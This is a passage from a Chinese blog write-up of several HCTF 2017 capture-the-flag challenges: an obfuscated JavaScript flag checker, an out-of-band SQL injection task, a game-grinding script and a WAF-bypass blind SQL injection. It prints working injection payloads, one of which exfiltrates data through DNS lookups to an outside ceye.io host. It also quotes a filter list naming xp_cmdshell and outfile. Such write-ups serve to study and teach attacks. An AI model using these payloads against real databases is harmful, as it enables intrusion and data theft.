class="string">'gg'</span>);</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5bf136 = <span class="built_in">document</span>[_0xa180(<span class="string">'0x32'</span>)](_0xa180(<span class="string">'0x33'</span>))[<span class="string">'value'</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0x5bf136 == <span class="string">''</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>[_0xa180(<span class="string">'0x34'</span>)](_0xa180(<span class="string">'0x35'</span>));</span><br><span class="line">        <span class="keyword">return</span> ![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x4d0e29 = check(_0x5bf136);</span><br><span class="line">    <span class="keyword">if</span> (_0x4d0e29) &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">'0x36'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(_0xa180(<span class="string">'0x37'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>[<span class="string">'onload'</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    setInterval(_0xa180(<span class="string">'0x38'</span>), <span class="number">0x32</span>);</span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从头开始看,可能部分源码需要还原一,我们先跟进代码看一下。<br>
大概逻辑是这样的：</p>
<ol>
<li>_0x180a是存储着以函数名为值的数组</li>
<li>_0xa180以函数的形式取出_0x180a的内容</li>
<li>通过各种check，得出flag</li>
</ol>
<p>对check流程进行分析下:</p>
<p>第一步:将flag以下划线分割</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x76e1e8 = _0x5b7c0c[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'_'</span>);</span><br></pre></td></tr></table></figure>
<p>第二步：s[0]检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> _0x34f55b = (_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x2</span>)) ^ _0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>))) % _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] == <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">if</span> (!_0x34f55b) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三步:s[2]检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x2</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'='</span>)[<span class="number">0x0</span>]) ^ <span class="number">0x53a3f32</span>;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>第四步:s[3]检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = _0x1c3854(b2c(_0x76e1e8[<span class="number">0x3</span>])[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'='</span>)[<span class="number">0x0</span>]) ^ e;</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>第五步:s[1]检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j = _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">'3'</span>);</span><br><span class="line">        <span class="keyword">if</span> (j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)] || (_0x1c3854(j[<span class="number">0x0</span>]) ^ _0x1c3854(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>第六步:s[4]检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="function"><span class="params">_0xffcc52</span> =&gt;</span> _0xffcc52[_0x43c8d1(<span class="string">'f'</span>)]() * _0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];</span><br><span class="line">l = h(j[<span class="number">0x0</span>], k);</span><br><span class="line"><span class="keyword">if</span> (l != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ![];</span><br><span class="line">&#125;</span><br><span class="line">m = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % l;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x5a6d56</span>(<span class="params">_0x5a25ab, _0x4a4483</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x55b09f = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x508ace = <span class="number">0x0</span>; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">        _0x55b09f += _0x5a25ab;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _0x55b09f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第七步:通过方程进行约束</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!m || _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>, <span class="number">0x1</span>), <span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>, <span class="number">0x4</span>) || _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x1</span>) - _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) != <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">o = _0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>))[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>) == _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x1</span>)[_0x43c8d1(<span class="string">'f'</span>)]() * _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)] * <span class="number">0x5</span>;</span><br><span class="line"><span class="keyword">return</span> o &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>) == <span class="number">0x2</span> &amp;&amp; _0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>, <span class="number">0x2</span>) == _0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>, <span class="number">0x1</span>), <span class="number">0x2</span>);</span><br></pre></td></tr></table></figure>
<p>整理一下这段方程：</p>
<ol>
<li>第五段的第六、七位不等于第五段的倒数五到八位</li>
<li>第五段的倒数第二位减去第五段的第四位等于一</li>
<li>第五段的七八位等于第七位的ASCII乘以第五段的长度再乘以5</li>
<li>第五段的第二位为2，第七、八位为第八位重复两次<br>
根据以上条件列方程<br>
解完方程之后，会发现前两位是多解，结合给出的sha256提示找到答案为J5，解出flag</li>
</ol>
<h2 id="2boring-website"><a class="markdownIt-Anchor" href="#2boring-website"></a> 2.boring website</h2>
<p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bob received a mission to write a login system on someone else's server, and he he only finished half of the work&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag is hctf&#123;what you get&#125;&lt;br /&gt;&lt;br /&gt;"</span>;</span><br><span class="line">error_reporting(E_ALL^E_NOTICE^E_WARNING);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   $conn = <span class="keyword">new</span> PDO( <span class="string">"sqlsrv:Server=*****;Database=not_here"</span>,<span class="string">"oob"</span>, <span class="string">""</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span>( PDOException $e ) &#123;</span><br><span class="line">   <span class="keyword">die</span>( <span class="string">"Error connecting to SQL Server"</span>.$e-&gt;getMessage() ); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo "Connected to MySQL&lt;br /&gt;";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Connected to SQL Server&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i'</span>, $id)) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'NoNoNo'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"select message from not_here_too where id = $id"</span>; <span class="comment">//link server: On  linkname:mysql</span></span><br><span class="line"></span><br><span class="line">$stmt = $conn-&gt;query( $query ); </span><br><span class="line"><span class="keyword">while</span> ( @$row = $stmt-&gt;fetch( PDO::FETCH_ASSOC ) )&#123;</span><br><span class="line">	<span class="comment">//TO DO: ...</span></span><br><span class="line">	<span class="comment">//It's time to sleep...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到看到oob的提示，于是可以想到sql oob带到dns解析泄露的操作<br>
继续往下阅读，遇到waf:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i'</span>, $id)) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'NoNoNo'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>仔细观察，可以发现没有过滤load_file(),于是可以使用load_file()进行oob攻击</p>
<p>具体的操作看这篇分享  <a href="http://bobao.360.cn/learning/detail/3458.html" target="_blank" rel="noopener">点击此处</a></p>
<p>接下来的问题就是需要一个dns服务器来进行测试，这里给个推荐，谁用谁知道hhhh  <a href="http://ceye.io/records/dns" target="_blank" rel="noopener">点我</a></p>
<p>接下来的任务就很简单了，构造payload，观察dns解析。</p>
<p>我构造的payload是</p>
<blockquote>
<p><a href="http://106.15.53.124:38324/?id=1;SELECT" target="_blank" rel="noopener">http://106.15.53.124:38324/?id=1;SELECT</a> * FROM OPENQUERY(mysql,‘select load_file(concat(0x5c5c5c5c,version(),0x2e6d65697a6a2e636579652e696f5c5c616263));’);</p>
</blockquote>
<p>记得使用十六进制 = =</p>
<p>然后的操作就很简单了，就是正常注入操作，暴库，表，字段。</p>
<h2 id="3poker"><a class="markdownIt-Anchor" href="#3poker"></a> 3.poker</h2>
<p>这个题一开始打开毫无头绪，后来队友过来说跑脚本到100级就可以了，但是时间太晚了，没来的及跑完。这里给一下他写的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://petgame.2017.hctf.io/function/Fight_Mod.php"</span></span><br><span class="line">param1 = &#123;<span class="string">'p'</span>:<span class="string">'138'</span>, <span class="string">'bid'</span>: <span class="string">'3234'</span>, <span class="string">'rd'</span>:<span class="string">'0.7266865914646525'</span>&#125;</span><br><span class="line">headers1 = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=t8i3qd0god2r49nn8vuuc5omc0'</span>&#125;</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">"http://petgame.2017.hctf.io/function/FightGate.php"</span></span><br><span class="line">param2 = &#123;<span class="string">'id'</span>:<span class="string">'1'</span>, <span class="string">'g'</span>: <span class="string">'19'</span>, <span class="string">'checkwg'</span>: <span class="string">'checked'</span>, <span class="string">'rd'</span>: <span class="string">'0.313130646160265'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    r1 = requests.get(url1, params=param1, headers=headers1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        r2 = requests.get(url2, params=param2, headers=headers1)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> (r2.text)</span><br></pre></td></tr></table></figure>
<h2 id="4sql-silencer"><a class="markdownIt-Anchor" href="#4sql-silencer"></a> 4.sql silencer</h2>
<p>进来一看就知道是个绕waf的题，通过测试，发现能过滤的差不多过滤没了。</p>
<p>然后有几个点，%0a,select,from,&lt;,&gt;没有过滤，所以大概猜测是用ascii函数进行对比挨个爆，然后使用%0d代替空格。</p>
<p>&lt;&gt;代表的是等于，因此可以构造出一个语句，大概思路是这样的：</p>
<blockquote>
<p>if (ascii(xxxx) &gt; {num})  return 1   else return 0</p>
</blockquote>
<p>根据这个思路最终构造得到的payload如下：</p>
<blockquote>
<p>id=1%0d&lt;&gt;%0d(select%0dcase%0dwhen%0d(ascii(substring((select%0dflag%0dfrom%0dhctf.flag%0dwhere%0dflag%0dlike%0d0x256863746625)from%0d42))&gt;0)%0dthen%0d(select%0d0)%0delse%0d(select%0d1)%0dend)</p>
</blockquote>
<p>这里爆出来的是一个路径，填入路径然后加上index.php，发现是个typecho，结合前段时间传的很火的typecho的后门，就能拿下来。</p>
<p>具体的操作看这篇  <a href="http://www.freebuf.com/vuls/152058.html" target="_blank" rel="noopener">点击此处</a></p>

    </div>

    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 Meizj.
        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label> -->
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="white">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script src="//unpkg.com/heti/umd/heti-addon.min.js"></script>
<script>
    const heti = new Heti('.heti');
    heti.autoSpacing();
  </script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>